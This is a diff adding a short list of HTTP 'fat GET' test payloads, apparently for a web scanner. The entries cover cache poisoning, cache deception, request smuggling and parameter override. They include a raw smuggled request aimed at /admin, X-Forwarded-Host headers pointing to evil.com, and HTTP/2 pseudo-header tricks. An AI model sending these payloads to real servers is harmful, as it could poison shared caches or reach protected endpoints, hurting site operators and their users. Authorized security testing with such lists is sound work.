@@ -1,0 +1,18 @@
+GET /?param=value HTTP/1.1 with body
+GET / with body content-length mismatch
+GET /admin HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 5\r\n\r\nGET /
+fat_get_cache_deception
+fat_get_body_param_override
+GET with POST body override
+GET /?x=1 HTTP/1.1 body: x=2
+GET /page?q=normal HTTP/1.1 body: q=poison
+GET / HTTP/1.1 X-Forwarded-Host: evil.com
+GET /cached_page?cb=UNIQUE HTTP/1.1
+GET /page?x=CACHEBUSTER HTTP/1.1 X-Forwarded-Host: evil.com
+fat_get_h2_pseudo_header
+GET with Transfer-Encoding: chunked body
+GET /resource HTTP/2 :path: /admin
+GET / HTTP/1.1 Trailer: poison
+GET / HTTP/1.1 body=GET /admin HTTP/1.1
+fat_get_smuggling_cache_poison
+GET /api/data HTTP/1.1 Host: TARGET X-Custom: POISON
